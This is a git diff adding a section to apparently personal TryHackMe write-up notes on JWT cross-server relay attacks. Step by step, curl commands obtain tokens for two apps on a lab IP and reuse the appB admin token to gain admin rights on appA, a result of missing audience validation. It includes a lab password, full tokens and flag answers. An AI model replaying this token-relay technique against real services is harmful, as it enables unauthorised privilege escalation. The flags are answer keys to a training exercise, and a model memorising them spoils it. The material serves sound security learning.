@@ -288,3 +288,57 @@ Use the proivided token to retrieve the flag.
 -> `THM{a450ae48-7226-4633-a63d-38a625368669}`
 
 ## Cross-Server Relay Attacks
+In some casese, one authentication servers can be used for different applications. Assume we have the same user on two different applications, who only has admin privilege on appB. If the authentication server is not configured correctly, it can accidentally grant the user amin privilege on appA, which is not supposed to be.
+
+**Demonstration**
+1. Retrieve the token of the `user` user on appA, then view it in [JWT.io](https://jwt.io/). We see there is an extra key **"aud"** whose value is **"appA"**
+
+```bash
+curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password7", "application" : "appA"}' http://10.10.29.20/api/v1.0/example7
+```
+
+![image](https://github.com/user-attachments/assets/f8f0ea1b-ac09-4e73-be6d-d2e6428cd611)
+
+2. Verify the username `user` on both **appA** and **appB**
+
+```bash
+# appA
+curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MCwiYXVkIjoiYXBwQSJ9.sl-84cMLYjxsD7SCySnnv3J9AMII9NKgz0-0vcak9t4' http://10.10.29.20/api/v1.0/example7_appA?username=user
+
+#appB
+curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MCwiYXVkIjoiYXBwQSJ9.sl-84cMLYjxsD7SCySnnv3J9AMII9NKgz0-0vcak9t4' http://10.10.29.20/api/v1.0/example7_appB?username=user
+```
+
+![image](https://github.com/user-attachments/assets/e618543a-df55-4cce-a822-b75f69b7c6ad)
+
+While the first command accepts the token and displays the user is not an admin, appB rejects the token due to invalid audience.
+
+3. Repeat step 1, with the `"application": "appB"`
+
+```bash
+curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password7", "application" : "appB"}' http://10.10.29.20/api/v1.0/example7
+```
+![image](https://github.com/user-attachments/assets/201a55de-240b-4211-87f2-f2f2993bdf36)
+
+4. We can guess: the token this time contains `"aud": "appB"` in the payload.
+   
+![image](https://github.com/user-attachments/assets/8bb26738-f01b-452d-b46f-29c350317809)
+
+5. Verify the user using this second token
+```bash
+curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MSwiYXVkIjoiYXBwQiJ9.jrTcVTGY9VIo-a-tYq_hvRTfnB4dMi_7j98Xvm-xb6o' http://10.10.29.20/api/v1.0/example7_appB?username=admin
+```
+![image](https://github.com/user-attachments/assets/c34bb0b3-5f35-4cce-ab18-8f200927cf71)
+
+6. Now that we know with this second JWT, we have amdmin privilege on appB. We can use the same JWT to check on appA
+```bash
+curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MSwiYXVkIjoiYXBwQiJ9.jrTcVTGY9VIo-a-tYq_hvRTfnB4dMi_7j98Xvm-xb6o' http://10.10.29.20/api/v1.0/example7_appA?username=admin
+```
+![image](https://github.com/user-attachments/assets/f7f713b0-d783-4c14-89be-601ce6e3a4e4)
+
+As expected, we get the admin privilege on appA, which is not supposed to be.
+
+### ANSWER THE QUESTIONS
+- **What is the flag for example 7?**
+
+-> THM{f0d34fe1-2ba1-44d4-bae7-99bd555a4128}
